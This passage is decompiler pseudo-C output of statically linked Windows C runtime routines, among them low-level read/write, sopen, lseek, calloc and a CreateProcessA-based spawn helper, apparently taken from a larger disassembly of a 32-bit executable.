  int v12; // edi@14
  const void *v13; // edx@11
  int v14; // [sp+Ch] [bp-80h]@2
  int v15; // [sp+18h] [bp-74h]@3
  int v16; // [sp+10h] [bp-7Ch]@3
  const void *v17; // [sp+1Ch] [bp-70h]@8
  char Buffer; // [sp+20h] [bp-6Ch]@9
  DWORD NumberOfBytesWritten; // [sp+14h] [bp-78h]@14

  if ( a1 >= nhandle
    || (v4 = 4 * (a1 >> 5) + 4242496, v5 = 8 * (a1 & 0x1F), v3 = *(_BYTE *)(_pioinfo[a1 >> 5] + v5 + 4), v14 = 4 * (a1 >> 5) + 4242496, !(v3 & 1)) )
  {
    doserrno = 0;
    goto LABEL_33;
  }
  v6 = 0;
  v15 = 0;
  v16 = 0;
  if ( !a3 )
    return 0;
  if ( v3 & 0x20 )
    lseeki64(a1, 0, 0, 2u);
  v8 = v5 + *(_DWORD *)v4;
  if ( *(_BYTE *)(v8 + 4) & 0x80 )
  {
    v17 = a2;
    a1 = 0;
    if ( a3 <= 0 )
    {
LABEL_28:
      if ( *(_BYTE *)(*(_DWORD *)v4 + v5 + 4) & 0x40 && *(_BYTE *)a2 == 26 )
        return 0;
      errno = 28;
      doserrno = v6;
      return -1;
    }
    while ( 1 )
    {
      v10 = v17 - a2;
      v9 = &Buffer;
      do
      {
        if ( v10 >= a3 )
          break;
        v13 = v17;
        v17 = (char *)v17 + 1;
        v11 = *(_BYTE *)v13;
        ++v10;
        if ( v11 == 10 )
        {
          ++v16;
          *v9++ = 13;
          ++v6;
        }
        v4 = v14;
        *v9++ = v11;
        ++v6;
      }
      while ( v6 < 1024 );
      v12 = v9 - &Buffer;
      if ( !WriteFile(*(HANDLE *)(*(_DWORD *)v4 + v5), &Buffer, v9 - &Buffer, &NumberOfBytesWritten, 0) )
        break;
      v15 += NumberOfBytesWritten;
      if ( (signed int)NumberOfBytesWritten < v12 )
        goto LABEL_19;
      v6 = 0;
      if ( v17 - a2 >= a3 )
        goto LABEL_20;
    }
    a1 = GetLastError();
LABEL_19:
    v6 = 0;
  }
  else
  {
    if ( WriteFile(*(HANDLE *)v8, a2, a3, &NumberOfBytesWritten, 0) )
    {
      a1 = 0;
      v15 = NumberOfBytesWritten;
    }
    else
    {
      a1 = GetLastError();
    }
  }
LABEL_20:
  if ( v15 != v6 )
    return v15 - v16;
  if ( a1 == v6 )
    goto LABEL_28;
  if ( a1 == 5 )
  {
    doserrno = 5;
LABEL_33:
    errno = 9;
    return -1;
  }
  dosmaperr(a1);
  return -1;
}

//----- (00405DD4) --------------------------------------------------------
int __cdecl commit(unsigned int a1)
{
  int result; // eax@4
  void *v2; // eax@3

  if ( a1 >= nhandle || !(*(_BYTE *)(_pioinfo[(signed int)a1 >> 5] + 8 * (a1 & 0x1F) + 4) & 1) )
    goto LABEL_8;
  v2 = (void *)get_osfhandle(a1);
  if ( FlushFileBuffers(v2) )
    result = 0;
  else
    result = GetLastError();
  if ( result )
  {
    doserrno = result;
LABEL_8:
    errno = 9;
    result = -1;
  }
  return result;
}

//----- (00405E2B) --------------------------------------------------------
int __cdecl read(int a1, void *a2, unsigned int a3)
{
  int v3; // eax@2
  char v4; // dl@2
  int v5; // edi@2
  int v6; // esi@2
  char *v7; // ecx@3
  void *v8; // ebx@3
  int v9; // eax@9
  int v11; // ecx@14
  char *v12; // ecx@19
  char v13; // al@20
  char v14; // al@31
  char v15; // al@7
  int v16; // eax@7
  char v17; // cf@19
  int v18; // [sp+10h] [bp-Ch]@3
  DWORD NumberOfBytesRead; // [sp+Ch] [bp-10h]@8
  void *v20; // [sp+14h] [bp-8h]@19
  char Buffer; // [sp+1Bh] [bp-1h]@27

  if ( a1 >= nhandle
    || (v5 = 4 * (a1 >> 5) + 4242496, v6 = 8 * (a1 & 0x1F), v3 = v6 + _pioinfo[a1 >> 5], v4 = *(_BYTE *)(v3 + 4), !(v4 & 1)) )
  {
    doserrno = 0;
    goto LABEL_46;
  }
  v18 = 0;
  v8 = a2;
  v7 = (char *)a2;
  if ( !a3 || v4 & 2 )
    return 0;
  if ( v4 & 0x48 )
  {
    if ( *(_BYTE *)(v3 + 5) != 10 )
    {
      v15 = *(_BYTE *)(_pioinfo[a1 >> 5] + v6 + 5);
      --a3;
      *(_BYTE *)a2 = v15;
      v16 = *(_DWORD *)v5;
      v7 = (char *)a2 + 1;
      v18 = 1;
      *(_BYTE *)(v16 + v6 + 5) = 10;
    }
  }
  if ( ReadFile(*(HANDLE *)(*(_DWORD *)v5 + v6), v7, a3, &NumberOfBytesRead, 0) )
  {
    v11 = *(_DWORD *)v5;
    v18 += NumberOfBytesRead;
    if ( *(_BYTE *)(v11 + v6 + 4) & 0x80 )
    {
      if ( NumberOfBytesRead && *(_BYTE *)v8 == 10 )
        *(_BYTE *)(v11 + v6 + 4) |= 4u;
      else
        *(_BYTE *)(*(_DWORD *)v5 + v6 + 4) &= 0xFBu;
      v12 = (char *)a2 + v18;
      v17 = a2 < (char *)a2 + v18;
      v20 = a2;
      v18 += (int)a2;
      if ( v17 )
      {
        do
        {
          v13 = *(_BYTE *)v20;
          if ( *(_BYTE *)v20 == 26 )
          {
            if ( !(*(_BYTE *)(*(_DWORD *)v5 + v6 + 4) & 0x40) )
              *(_BYTE *)(*(_DWORD *)v5 + v6 + 4) |= 2u;
            break;
          }
          if ( v13 == 13 )
          {
            if ( v20 < v12 - 1 )
            {
              if ( *((_BYTE *)v20 + 1) != 10 )
              {
                v20 = (char *)v20 + 1;
LABEL_37:
                *(_BYTE *)v8 = 13;
LABEL_38:
                v8 = (char *)v8 + 1;
                goto LABEL_39;
              }
              v20 = (char *)v20 + 2;
              goto LABEL_35;
            }
            v20 = (char *)v20 + 1;
            if ( !ReadFile(*(HANDLE *)(*(_DWORD *)v5 + v6), &Buffer, 1u, &NumberOfBytesRead, 0) && GetLastError()
              || !NumberOfBytesRead )
              goto LABEL_37;
            if ( *(_BYTE *)(*(_DWORD *)v5 + v6 + 4) & 0x48 )
            {
              v14 = Buffer;
              if ( Buffer != 10 )
              {
                *(_BYTE *)v8 = 13;
                *(_BYTE *)(*(_DWORD *)v5 + v6 + 5) = v14;
                goto LABEL_38;
              }
LABEL_35:
              *(_BYTE *)v8 = 10;
              goto LABEL_38;
            }
            if ( v8 == a2 && Buffer == 10 )
              goto LABEL_35;
            lseek(a1, -1, 1);
            if ( Buffer != 10 )
              goto LABEL_37;
          }
          else
          {
            *(_BYTE *)v8 = v13;
            v8 = (char *)v8 + 1;
            v20 = (char *)v20 + 1;
          }
LABEL_39:
          v12 = (char *)v18;
        }
        while ( (unsigned int)v20 < v18 );
      }
      v18 = v8 - a2;
    }
    return v18;
  }
  v9 = GetLastError();
  if ( v9 == 5 )
  {
    doserrno = 5;
LABEL_46:
    errno = 9;
    return -1;
  }
  if ( v9 == 109 )
    return 0;
  dosmaperr(v9);
  return -1;
}

//----- (00406019) --------------------------------------------------------
int __cdecl getbuf(int a1)
{
  int result; // eax@4
  int v2; // eax@1

  ++cflush;
  v2 = malloc(0x1000u);
  *(_DWORD *)(a1 + 8) = v2;
  if ( v2 )
  {
    *(_DWORD *)(a1 + 12) |= 8u;
    *(_DWORD *)(a1 + 24) = 4096;
  }
  else
  {
    *(_DWORD *)(a1 + 12) |= 4u;
    *(_DWORD *)(a1 + 8) = a1 + 20;
    *(_DWORD *)(a1 + 24) = 2;
  }
  result = *(_DWORD *)(a1 + 8);
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)a1 = result;
  return result;
}

//----- (0040605D) --------------------------------------------------------
int sopen(const char *a1, int a2, int a3, ...)
{
  int v4; // eax@23
  DWORD v5; // esi@39
  int v6; // ebx@51
  HANDLE v7; // eax@54
  void *v8; // esi@54
  DWORD v9; // eax@55
  char v10; // al@62
  int v11; // esi@62
  int v12; // eax@51
  int v13; // eax@57
  int v14; // ecx@62
  char v15; // zf@62
  __int32 v16; // eax@65
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [sp+8h] [bp-1Ch]@1
  unsigned __int8 v18; // [sp+23h] [bp-1h]@2
  DWORD dwDesiredAccess; // [sp+14h] [bp-10h]@11
  DWORD dwShareMode; // [sp+1Ch] [bp-8h]@19
  DWORD dwCreationDisposition; // [sp+18h] [bp-Ch]@29
  va_list va; // [sp+38h] [bp+14h]@1
  char v23; // [sp+22h] [bp-2h]@72

  va_start(va, a3);
  SecurityAttributes.nLength = 12;
  SecurityAttributes.lpSecurityDescriptor = 0;
  if ( (_BYTE)a2 >= 0 )
  {
    SecurityAttributes.bInheritHandle = 1;
    v18 = 0;
  }
  else
  {
    SecurityAttributes.bInheritHandle = 0;
    v18 = 16;
  }
  if ( !(a2 & 0x8000) )
  {
    if ( BYTE1(a2) & 0x40 || fmode != 32768 )
      v18 |= 0x80u;
  }
  if ( a2 & 3 )
  {
    if ( (a2 & 3) == 1 )
    {
      dwDesiredAccess = 1073741824;
    }
    else
    {
      if ( (a2 & 3) != 2 )
      {
LABEL_18:
        errno = 22;
        doserrno = 0;
        return -1;
      }
      dwDesiredAccess = -1073741824;
    }
  }
  else
  {
    dwDesiredAccess = -2147483648;
  }
  switch ( a3 )
  {
    case 0x10:
      dwShareMode = 0;
      break;
    case 0x20:
      dwShareMode = 1;
      break;
    case 0x30:
      dwShareMode = 2;
      break;
    default:
      if ( a3 != 64 )
        goto LABEL_18;
      dwShareMode = 3;
      break;
  }
  v4 = a2 & 0x700;
  if ( (a2 & 0x700) <= 1024 )
  {
    if ( v4 == 1024 || !v4 )
    {
      dwCreationDisposition = 3;
      goto LABEL_39;
    }
    if ( v4 == 256 )
    {
      dwCreationDisposition = 4;
      goto LABEL_39;
    }
    if ( v4 != 512 )
    {
      if ( v4 == 768 )
      {
        dwCreationDisposition = 2;
        goto LABEL_39;
      }
LABEL_35:
      errno = 22;
      doserrno = 0;
      return -1;
    }
    goto LABEL_37;
  }
  if ( v4 != 1280 )
  {
    if ( v4 == 1536 )
    {
LABEL_37:
      dwCreationDisposition = 5;
      goto LABEL_39;
    }
    if ( v4 != 1792 )
      goto LABEL_35;
  }
  dwCreationDisposition = 1;
LABEL_39:
  v5 = 128;
  if ( a2 & 0x100 )
  {
    if ( ((_BYTE)*(int *)va & (unsigned __int8)~(_BYTE)umaskval) >= 0 )
      v5 = 1;
  }
  if ( a2 & 0x40 )
  {
    BYTE2(dwDesiredAccess) |= 1u;
    v5 |= 0x4000000u;
    if ( osplatform == 2 )
      dwShareMode |= 4u;
  }
  if ( BYTE1(a2) & 0x10 )
    v5 |= 0x100u;
  if ( a2 & 0x20 )
  {
    v5 |= 0x8000000u;
  }
  else
  {
    if ( a2 & 0x10 )
      v5 |= 0x10000000u;
  }
  v12 = alloc_osfhnd();
  v6 = v12;
  if ( v12 == -1 )
  {
    doserrno = 0;
    errno = 24;
    return -1;
  }
  v7 = CreateFileA(a1, dwDesiredAccess, dwShareMode, &SecurityAttributes, dwCreationDisposition, v5, 0);
  v8 = v7;
  if ( v7 == (HANDLE)-1 )
  {
LABEL_57:
    v13 = GetLastError();
    dosmaperr(v13);
    return -1;
  }
  v9 = GetFileType(v7);
  if ( !v9 )
  {
    CloseHandle(v8);
    goto LABEL_57;
  }
  if ( v9 == 2 )
  {
    v18 |= 0x40u;
  }
  else
  {
    if ( v9 == 3 )
      v18 |= 8u;
  }
  set_osfhnd(v6, v8);
  v10 = v18 | 1;
  v14 = _pioinfo[v6 >> 5];
  v11 = 8 * (v6 & 0x1F);
  v18 |= 1u;
  v15 = (v18 & 0x48) == 0;
  v18 &= 0x48u;
  *(_BYTE *)(v14 + v11 + 4) = v10;
  if ( v15 && v10 < 0 && a2 & 2 )
  {
    v16 = lseek(v6, -1, 2);
    dwDesiredAccess = v16;
    if ( v16 == -1 )
    {
      if ( doserrno == 131 )
        goto LABEL_67;
    }
    else
    {
      v23 = 0;
      if ( (read(v6, &v23, 1u) || v23 != 26 || chsize(v6, dwDesiredAccess) != -1) && lseek(v6, 0, 0) != -1 )
        goto LABEL_67;
    }
    close(v6);
    return -1;
  }
LABEL_67:
  if ( !v18 )
  {
    if ( a2 & 8 )
      *(_BYTE *)(_pioinfo[v6 >> 5] + v11 + 4) |= 0x20u;
  }
  return v6;
}

//----- (0040632D) --------------------------------------------------------
int __cdecl getpath(int a1, int a2, int a3)
{
  int v3; // ecx@1
  int v4; // eax@4
  int v5; // esi@4
  char v6; // dl@10
  char v7; // dl@16
  char v9; // zf@4
  char v10; // zf@8
  char v11; // zf@12

  v3 = a1;
  while ( *(_BYTE *)v3 == 59 )
    ++v3;
  v9 = a3-- == 1;
  v5 = a2;
  v4 = v3;
  if ( !v9 )
  {
    while ( 1 )
    {
      v7 = *(_BYTE *)v3;
      if ( !*(_BYTE *)v3 )
        break;
      if ( v7 == 59 )
        goto LABEL_18;
      if ( v7 == 34 )
      {
        ++v3;
        v6 = *(_BYTE *)v3;
        if ( !*(_BYTE *)v3 )
          break;
        do
        {
          if ( v6 == 34 )
            break;
          *(_BYTE *)v5++ = v6;
          ++v3;
          v11 = a3-- == 1;
          if ( v11 )
            goto LABEL_9;
          v6 = *(_BYTE *)v3;
        }
        while ( *(_BYTE *)v3 );
        if ( !*(_BYTE *)v3 )
          break;
        ++v3;
      }
      else
      {
        *(_BYTE *)v5++ = v7;
        ++v3;
        v10 = a3-- == 1;
        if ( v10 )
        {
LABEL_9:
          v4 = v3;
          goto LABEL_20;
        }
      }
    }
    while ( *(_BYTE *)v3 == 59 )
LABEL_18:
      ++v3;
  }
LABEL_20:
  *(_BYTE *)v5 = 0;
  return v3 & -(v4 != v3);
}

//----- (0040639C) --------------------------------------------------------
int __cdecl mbsrchr(int a1, char a2)
{
  int result; // eax@1
  int v3; // edx@3
  int v4; // ecx@4
  unsigned __int8 v5; // bl@4
  char v6; // zf@8

  result = 0;
  if ( _ismbcodepage )
  {
    v3 = a1;
    while ( 1 )
    {
      v5 = *(_BYTE *)v3;
      v4 = *(_BYTE *)v3;
      if ( !(byte_40B9E1[(unsigned __int8)v4] & 4) )
        break;
      ++v3;
      v5 = *(_BYTE *)v3;
      if ( !*(_BYTE *)v3 )
      {
        v6 = result == 0;
        goto LABEL_10;
      }
      if ( a2 == (v5 | (v4 << 8)) )
        result = v3 - 1;
LABEL_12:
      ++v3;
      if ( !v5 )
        return result;
    }
    v6 = a2 == v4;
LABEL_10:
    if ( v6 )
      result = v3;
    goto LABEL_12;
  }
  return strrchr(a1, a2);
}

//----- (004063F2) --------------------------------------------------------
int __cdecl mbschr(unsigned __int16 *a1, int a2)
{
  unsigned __int16 *v3; // ecx@3
  unsigned __int16 v4; // ax@10

  if ( !_ismbcodepage )
    return strchr(a1, a2);
  v3 = a1;
  while ( 1 )
  {
    v4 = *(_BYTE *)v3;
    if ( !v4 )
      return (unsigned int)v3 & -(a2 == *(_BYTE *)v3);
    if ( byte_40B9E1[(unsigned __int8)v4] & 4 )
      break;
    if ( a2 == *(_BYTE *)v3 )
      return (unsigned int)v3 & -(a2 == *(_BYTE *)v3);
LABEL_9:
    v3 = (unsigned __int16 *)((char *)v3 + 1);
  }
  v3 = (unsigned __int16 *)((char *)v3 + 1);
  if ( *(_BYTE *)v3 )
  {
    if ( a2 == (*(_BYTE *)v3 | (v4 << 8)) )
      return (int)((char *)v3 - 1);
    goto LABEL_9;
  }
  return 0;
}

//----- (00406459) --------------------------------------------------------
signed int __cdecl dospawn(int a1, LPCSTR lpApplicationName, int a3, LPVOID lpEnvironment)
{
  unsigned __int32 v4; // ebx@1
  int v5; // eax@7
  UINT v7; // esi@13
  signed int v8; // eax@14
  LPBYTE v9; // eax@17
  HANDLE *v10; // edx@17
  LPBYTE v11; // ecx@17
  BYTE v12; // al@18
  int v13; // edi@18
  int v14; // eax@24
  signed int v15; // edx@24
  int v16; // ecx@24
  signed int v17; // edi@26
  int v18; // edi@31
  bool v19; // eax@17
  BOOL v20; // esi@31
  DWORD dwCreationFlags; // [sp+60h] [bp-Ch]@1
  char v22; // [sp+6Bh] [bp-1h]@1
  LPSTR lpCommandLine; // [sp+5Ch] [bp-10h]@7
  struct _STARTUPINFOA StartupInfo; // [sp+4h] [bp-68h]@13
  signed int v25; // [sp+64h] [bp-8h]@17
  struct _PROCESS_INFORMATION ProcessInformation; // [sp+48h] [bp-24h]@31
  DWORD ExitCode; // [sp+58h] [bp-14h]@36

  v4 = 0;
  dwCreationFlags = 0;
  v22 = 0;
  if ( a1 && a1 != 1 )
  {
    if ( a1 <= 1 )
      goto LABEL_8;
    if ( a1 > 3 )
    {
      if ( a1 == 4 )
      {
        v22 = 1;
        goto LABEL_7;
      }
LABEL_8:
      errno = 22;
      doserrno = 0;
      return -1;
    }
  }
LABEL_7:
  v5 = a3;
  lpCommandLine = (LPSTR)a3;
  while ( *(_BYTE *)v5 )
  {
    do
      ++v5;
    while ( *(_BYTE *)v5 );
    if ( *(_BYTE *)(v5 + 1) )
      *(_BYTE *)v5++ = 32;
  }
  memset(&StartupInfo, 0, 0x44u);
  StartupInfo.cb = 68;
  v7 = nhandle;
  if ( nhandle )
  {
    v8 = nhandle - 1;
    do
    {
      if ( *(_BYTE *)(_pioinfo[v8 >> 5] + 8 * (v8 & 0x1F) + 4) )
        break;
      --v7;
      --v8;
    }
    while ( v7 );
  }
  StartupInfo.cbReserved2 = 5 * (_WORD)v7 + 4;
  v19 = calloc((unsigned __int16)(5 * (_WORD)v7 + 4), 1);
  StartupInfo.lpReserved2 = (LPBYTE)v19;
  *(_DWORD *)v19 = v7;
  v9 = StartupInfo.lpReserved2;
  v25 = 0;
  v11 = StartupInfo.lpReserved2 + 4;
  v10 = &StartupInfo.hStdInput + v7;
  if ( (signed int)v7 > 0 )
  {
    do
    {
      v13 = _pioinfo[v25 >> 5] + 8 * (v25 & 0x1F);
      v12 = *(_BYTE *)(v13 + 4);
      if ( v12 & 0x10 )
      {
        *v11 = 0;
        *v10 = (HANDLE)-1;
      }
      else
      {
        *v11 = v12;
        *v10 = *(HANDLE *)v13;
      }
      ++v25;
      ++v11;
      ++v10;
    }
    while ( v25 < (signed int)v7 );
    v9 = StartupInfo.lpReserved2;
  }
  if ( v22 )
  {
    v16 = (int)(v9 + 4);
    v15 = 0;
    v14 = (int)&v9[v7 + 4];
    while ( 1 )
    {
      if ( (signed int)v7 >= 3 )
        v17 = 3;
      else
        v17 = v7;
      if ( v15 >= v17 )
        break;
      *(_BYTE *)v16 = 0;
      *(_DWORD *)v14 = -1;
      ++v15;
      ++v16;
      v14 += 4;
    }
    dwCreationFlags = 8;
  }
  errno = 0;
  doserrno = 0;
  v20 = CreateProcessA(
          lpApplicationName,
          lpCommandLine,
          0,
          0,
          1,
          dwCreationFlags,
          lpEnvironment,
          0,
          &StartupInfo,
          &ProcessInformation);
  v18 = GetLastError();
  free((int)StartupInfo.lpReserved2);
  if ( !v20 )
  {
    dosmaperr(v18);
    return -1;
  }
  if ( a1 == 2 )
    exit(0);
  if ( a1 )
  {
    if ( a1 != 4 )
    {
      v4 = (_DWORD)ProcessInformation.hProcess;
      goto LABEL_40;
    }
  }
  else
  {
    WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFFu);
    GetExitCodeProcess(ProcessInformation.hProcess, &ExitCode);
    v4 = ExitCode;
  }
  CloseHandle(ProcessInformation.hProcess);
LABEL_40:
  CloseHandle(ProcessInformation.hThread);
  return v4;
}

//----- (0040662A) --------------------------------------------------------
signed int __cdecl cenvarg(int *a1, int *a2, int *a3, int a4)
{
  int *v4; // ebx@1
  DWORD v5; // edi@1
  signed int v6; // esi@1
  int *v7; // edi@6
  int *v8; // ebx@7
  int *v9; // edi@7
  int v10; // esi@8
  int v11; // esi@9
  int v12; // eax@12
  char v14; // cl@16
  int v15; // edi@16
  int v16; // eax@19
  int v17; // eax@29
  int v18; // esi@30
  int *v19; // edi@31
  int v20; // eax@4
  int v21; // eax@25
  int *v22; // esi@26
  char v23; // zf@30

  v4 = a1;
  v6 = 2;
  v5 = 2;
  while ( *v4 )
  {
    v5 += strlen(*v4) + 1;
    ++v4;
  }
  v20 = malloc(v5);
  *a3 = v20;
  if ( !v20 )
  {
    *(_DWORD *)a4 = 0;
    errno = 12;
    doserrno = 8;
    return -1;
  }
  v7 = a2;
  if ( a2 )
  {
    while ( *v7 )
    {
      v6 += strlen(*v7) + 1;
      ++v7;
    }
    v12 = aenvptr;
    if ( !aenvptr )
    {
      v12 = _crtGetEnvironmentStringsA();
      aenvptr = v12;
      if ( !v12 )
        return -1;
    }
    v8 = 0;
    if ( *(_BYTE *)v12 )
    {
      v14 = *(_BYTE *)v12;
      v15 = v12;
      do
      {
        if ( v14 == 61 )
          break;
        v8 = (int *)((char *)v8 + strlen(v15) + 1);
        v12 = aenvptr;
        v15 = (int)((char *)v8 + aenvptr);
        v14 = *((_BYTE *)v8 + aenvptr);
      }
      while ( v14 );
    }
    v9 = v8;
    v16 = (int)((char *)v8 + v12);
    while ( *(_BYTE *)v16 == 61 && *(_BYTE *)(v16 + 1) && *(_BYTE *)(v16 + 2) == 58 && *(_BYTE *)(v16 + 3) == 61 )
    {
      v9 = (int *)((char *)v9 + strlen(v16 + 4) + 5);
      v16 = (int)((char *)v9 + aenvptr);
    }
    v21 = malloc(v6 + (char *)v9 - (char *)v8);
    *(_DWORD *)a4 = v21;
    if ( !v21 )
    {
      v22 = a3;
      free(*a3);
      *v22 = 0;
      errno = 12;
      doserrno = 8;
      return -1;
    }
  }
  else
  {
    *(_DWORD *)a4 &= (unsigned int)a2;
    v8 = a1;
    v9 = a1;
  }
  v10 = *a3;
  a3 = a1;
  if ( !*a1 )
    goto LABEL_28;
  strcpy(v10);
  v11 = v10 + strlen(*a1) + 1;
  a3 = a1 + 1;
  while ( 1 )
  {
    v17 = *a3;
    if ( !*a3 )
      break;
    strcpy(v11);
    v10 = strlen(*a3) + v11;
    ++a3;
    *(_BYTE *)v10 = 32;
LABEL_28:
    v11 = v10 + 1;
  }
  v23 = a2 == 0;
  *(_BYTE *)(v11 - 1) = v17;
  *(_BYTE *)v11 = v17;
  v18 = *(_DWORD *)a4;
  if ( !v23 )
  {
    memcpy(*(_DWORD *)a4, (char *)v8 + aenvptr, (char *)v9 - (char *)v8);
    v18 += (char *)v9 - (char *)v8;
    v19 = a2;
    while ( *v19 )
    {
      strcpy(v18);
      v18 += strlen(*v19) + 1;
      ++v19;
    }
  }
  if ( v18 )
  {
    if ( v18 == *(_DWORD *)a4 )
      *(_BYTE *)v18++ = 0;
    *(_BYTE *)v18 = 0;
  }
  free(aenvptr);
  aenvptr = 0;
  return 0;
}

//----- (00406837) --------------------------------------------------------
int __cdecl mbsnbicoll(LPCSTR lpMultiByteStr, LPCSTR lpString2, int cchCount2)
{
  int result; // eax@2
  signed int v4; // eax@3

  if ( cchCount2 )
  {
    v4 = _crtCompareStringA(_mblcid, 1u, lpMultiByteStr, cchCount2, lpString2, cchCount2, _mbcodepage);
    if ( v4 )
      result = v4 - 2;
    else
      result = 2147483647;
  }
  else
  {
    result = 0;
  }
  return result;
}

//----- (00406876) --------------------------------------------------------
signed int __cdecl _wtomb_environ()
{
  const WCHAR *v0; // eax@1
  int v1; // edi@1
  int v2; // eax@2
  int v3; // eax@3
  signed int result; // eax@9
  int v5; // [sp+10h] [bp-4h]@1
  int cchMultiByte; // [sp+Ch] [bp-8h]@2

  v1 = wenviron;
  v5 = 0;
  v0 = *(const WCHAR **)wenviron;
  if ( *(_DWORD *)wenviron )
  {
    while ( 1 )
    {
      v2 = WideCharToMultiByte(0, 0, v0, -1, 0, 0, 0, 0);
      cchMultiByte = v2;
      if ( !v2 )
        break;
      v3 = malloc(v2);
      v5 = v3;
      if ( !v3 )
        break;
      if ( !WideCharToMultiByte(0, 0, *(LPCWSTR *)v1, -1, (LPSTR)v3, cchMultiByte, 0, 0) )
      {
        free(v5);
        break;
      }
      if ( _crtsetenv((unsigned __int16 **)&v5, 0) < 0 )
      {
        if ( v5 )
        {
          free(v5);
          v5 = 0;
        }
      }
      v1 += 4;
      v0 = *(const WCHAR **)v1;
      if ( !*(_DWORD *)v1 )
        goto LABEL_9;
    }
    result = -1;
  }
  else
  {
LABEL_9:
    result = 0;
  }
  return result;
}

//----- (00406906) --------------------------------------------------------
__int32 __cdecl lseek(int a1, __int32 a2, int a3)
{
  int v3; // edi@2
  int v4; // esi@2
  signed int v5; // eax@3
  __int32 v6; // ebx@4
  int v7; // eax@5
  DWORD v9; // eax@4

  if ( a1 >= nhandle
    || (v3 = 4 * (a1 >> 5) + 4242496, v4 = 8 * (a1 & 0x1F), !(*(_BYTE *)(_pioinfo[a1 >> 5] + v4 + 4) & 1)) )
  {
    doserrno = 0;
    goto LABEL_11;
  }
  v5 = get_osfhandle(a1);
  if ( v5 == -1 )
  {
LABEL_11:
    errno = 9;
    return -1;
  }
  v9 = SetFilePointer((HANDLE)v5, a2, 0, a3);
  v6 = v9;
  if ( v9 == -1 )
    v7 = GetLastError();
  else
    v7 = 0;
  if ( !v7 )
  {
    *(_BYTE *)(*(_DWORD *)v3 + v4 + 4) &= 0xFDu;
    return v6;
  }
  dosmaperr(v7);
  return -1;
}

//----- (00406992) --------------------------------------------------------
int __cdecl isatty(int a1)
{
  int result; // eax@2

  if ( a1 < nhandle )
    result = *(_BYTE *)(_pioinfo[a1 >> 5] + 8 * (a1 & 0x1F) + 4) & 0x40;
  else
    result = 0;
  return result;
}

//----- (004069B9) --------------------------------------------------------
int __cdecl wctomb(LPSTR UsedDefaultChar, const WCHAR WideCharStr)
{
  CHAR *v2; // eax@1
  int result; // eax@2

  v2 = UsedDefaultChar;
  if ( !UsedDefaultChar )
    return 0;
  if ( !Locale )
  {
    if ( WideCharStr <= 0xFFu )
    {
      *UsedDefaultChar = WideCharStr;
      return 1;
    }
    goto LABEL_8;
  }
  UsedDefaultChar = 0;
  result = WideCharToMultiByte(_lc_codepage, 0, &WideCharStr, 1, v2, _mb_cur_max, 0, (BOOL *)&UsedDefaultChar);
  if ( !result || UsedDefaultChar )
  {
LABEL_8:
    errno = 42;
    result = -1;
  }
  return result;
}

//----- (00406A20) --------------------------------------------------------
int __stdcall aulldvrm(unsigned __int64 a1, unsigned int a2, unsigned int a3)
{
  int v3; // esi@2
  unsigned __int64 v4; // qax@3
  unsigned int v5; // ecx@3
  unsigned int v6; // ebx@3
  int v7; // eax@5
  int v8; // edx@5
  unsigned __int8 v10; // cf@4
  unsigned __int8 v11; // cf@4
  int v12; // eax@5
  int v13; // ecx@5
  __int64 v14; // qt2@5
  int v15; // edx@5
  unsigned __int8 v16; // cf@5

  if ( a3 )
  {
    v5 = a3;
    v6 = a2;
    v4 = a1;
    do
    {
      v10 = __MKCSHR__(v5, 1);
      v5 >>= 1;
      v6 = __RCR__(v6, v10);
      v11 = __MKCSHR__(*((_DWORD *)&v4 + 1), 1);
      *((_DWORD *)&v4 + 1) >>= 1;
      *(_DWORD *)&v4 = __RCR__(v4, v11);
    }
    while ( v5 );
    v12 = v4 / v6;
    v3 = v12;
    v13 = a3 * v12;
    v14 = v12 * a2;
    v7 = v12 * a2;
    v15 = *((_DWORD *)&v14 + 1);
    v16 = __MKCADD__(v13, v15);
    v8 = v13 + v15;
    if ( v16
      || (unsigned int)v8 > *((_DWORD *)&a1 + 1)
      || (unsigned int)v8 >= *((_DWORD *)&a1 + 1) && (unsigned int)v7 > (_DWORD)a1 )
      --v3;
  }
  else
  {
    v3 = a1 / a2;
  }
  return v3;
}

//----- (00406AB5) --------------------------------------------------------
bool __cdecl calloc(int a1, int a2)
{
  unsigned int v2; // ebx@1
  int v3; // esi@1
  void *v4; // edi@3
  int v5; // eax@6
  bool result; // eax@9
  LPVOID v7; // eax@7

  v3 = a2 * a1;
  v2 = a2 * a1;
  if ( !(a2 * a1) )
    ++v3;
  while ( 1 )
  {
    v4 = 0;
    if ( (unsigned int)v3 > 0xFFFFFFE0 )
      goto LABEL_8;
    if ( _active_heap == 3 )
    {
      v3 = (v3 + 15) & 0xFFFFFFF0;
      if ( v2 <= _sbh_threshold )
      {
        v5 = _sbh_alloc_block(v2);
        v4 = (void *)v5;
        if ( v5 )
          break;
      }
    }
    v7 = HeapAlloc(crtheap, 8u, v3);
    v4 = v7;
    if ( v7 )
      return (bool)v4;
LABEL_8:
    if ( !newmode )
      return (bool)v4;
    result = callnewh(v3);
    if ( !result )
      return result;
  }
  memset((void *)v5, 0, v2);
  return (bool)v4;
}

//----- (00406B30) --------------------------------------------------------
int __cdecl fcloseall()
{
  int i; // edi@1
  int v1; // esi@1
  int v2; // eax@2

  v1 = 3;
  for ( i = 0; v1 < nstream; ++v1 )
  {
    v2 = *(_DWORD *)(_piob + 4 * v1);
    if ( v2 )
    {
      if ( *(_BYTE *)(v2 + 12) & 0x83 )
      {
        if ( fclose(*(_DWORD *)(_piob + 4 * v1)) != -1 )
          ++i;
      }
      if ( v1 >= 20 )
      {
        free(*(_DWORD *)(_piob + 4 * v1));
        *(_DWORD *)(_piob + 4 * v1) = 0;
      }
    }
  }
  return i;
}

//----- (00406B88) --------------------------------------------------------
BOOL __thiscall isctype(int this, signed int CharType, int a3)
{
  int v3; // eax@2
  signed int v4; // ecx@3
  int v5; // eax@4
  BOOL result; // eax@6
  int MultiByteStr; // [sp+0h] [bp-4h]@1

  MultiByteStr = this;
  if ( (unsigned int)(CharType + 1) <= 0x100 )
  {
    v3 = (*pctype)[CharType];
    return a3 & v3;
  }
  v4 = CharType >> 8;
  if ( HIBYTE((*pctype)[BYTE1(CharType)]) & 0x80 )
  {
    BYTE1(MultiByteStr) = CharType;
    LOBYTE(MultiByteStr) = v4;
    BYTE2(MultiByteStr) = 0;
    v5 = 2;
  }
  else
  {
    LOBYTE(MultiByteStr) = CharType;
    BYTE1(MultiByteStr) = 0;
    v5 = 1;
  }
